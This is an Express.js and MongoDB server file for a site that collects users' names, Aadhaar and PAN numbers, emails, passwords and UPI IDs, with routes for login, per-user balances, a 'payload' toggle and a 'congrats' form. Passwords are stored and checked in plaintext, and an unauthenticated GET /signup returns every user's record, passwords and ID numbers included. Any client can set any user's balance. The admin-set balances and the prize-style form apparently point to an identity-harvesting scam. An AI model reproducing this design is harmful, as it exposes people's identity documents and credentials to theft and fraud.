const express = require('express');
const cors = require('cors');
const connectDB = require('./db/db');
const User = require('./model/users');
const Value = require('./model/value');
const Payload = require('./model/payload');
const Congrats = require('./model/congrats');

const app = express();
const port = 5000;

app.use(cors());
app.use(express.json());

connectDB();

// SIgnup collect to mongodb
app.post('/signup', async (req, res) => {
    const { fullname, aadharcard, pancard, email, password } = req.body;

    try {
        const existingUser = await User.findOne({ email });

        if (existingUser) {
            return res.json('exist');
        }

        const newUser = new User({
            fullname,
            aadharcard,
            pancard,
            email,
            password
        });

        await newUser.save();
        return res.json('notexist');
    } catch (error) {
        console.error(error);
        return res.status(500).json('error');
    }
});


// check login user 
app.post('/login', async (req, res) => {
    const { email, password } = req.body;

    try {
        const user = await User.findOne({ email });

        if (user) {
            if (user.password === password) {
                return res.json({ status: 'exist', email }); // Send email with status
            } else {
                return res.json({ status: 'wrongpassword' });
            }
        } else {
            return res.json({ status: 'notexist' });
        }
    } catch (error) {
        console.error(error);
        return res.status(500).json('error');
    }
});
//  fetching all users from mongodb
 app.get('/signup', async (req , res) =>{
    try {
        const users = await User.find();
        res.json(users);
    }catch (error){
        console.error(error);
        res.status(500).json({message:'Error fetching userss'})
    }   
 })

 app.post('/balance', async (req, res) => {
  const { email , balance } = req.body;

  try {
      const existingUser = await Value.findOne({ email });

      if (existingUser) {
          existingUser.balance = balance;
          await existingUser.save();
          return res.json('balanceUpdated');
      }
      const newValue = new Value({ email, balance });
      await newValue.save();
      return res.json('balanceUpdated');
  } catch (error) {
      console.error(error);
      return res.status(500).json('error');
  }
});

app.get('/balance', async (req, res) => {
  const { email } = req.query;

  try {
      const balanceData = await Value.findOne({ email });

      if (balanceData) {
          return res.json({ balance: balanceData.balance });
      } else {
          return res.json({ balance: 0 });
      }
  } catch (error) {
      console.error(error);
      return res.status(500).json('error');
  }
});

 app.post('/payload', async (req, res) => {
    const { email, isEnabled } = req.body;
  
    if (!email || typeof isEnabled !== 'boolean') {
      return res.status(400).json({ error: 'Email and isEnabled (boolean) are required.' });
    }
  
    try {
      const updated = await Payload.findOneAndUpdate(
        { email },
        { $set: { isEnabled } },
        { upsert: true, new: true }
      );
      res.json({ message: 'Status updated', data: updated });
    } catch (err) {
      console.error('Error in POST /payload:', err);
      res.status(500).json({ error: 'Database error' });
    }
  });
  
  app.get('/payload', async (req, res) => {
    try {
      const all = await Payload.find();
      res.json(all);
    } catch (err) {
      console.error('Error in GET /payload:', err);
      res.status(500).json({ error: 'Database error' });
    }
  });
  
  app.get('/payload/:email', async (req, res) => {
    const { email } = req.params;
  
    try {
      const userStatus = await Payload.findOne({ email });
      if (userStatus) {
        res.json(userStatus);
      } else {
        res.status(404).json({ message: 'User not found' });
      }
    } catch (err) {
      console.error('Error in GET /payload/:email:', err);
      res.status(500).json({ error: 'Database error' });
    }
  });

app.post('/congrats', async (req, res) => {
    const {Username , Pancard , UpiId} = req.body;
    try {
        const NewCongrats = new Congrats({
            Username,
            Pancard,
            UpiId,
        })
        NewCongrats.save();
        res.json('Details submitted successfully' );
      } catch (error) {
          console.error('Error saving data:', error);
          res.json('Failed to submit details');
      }
  });


app.listen(port, () => {
    console.log(`Rendering of pages is ${port}`);
})


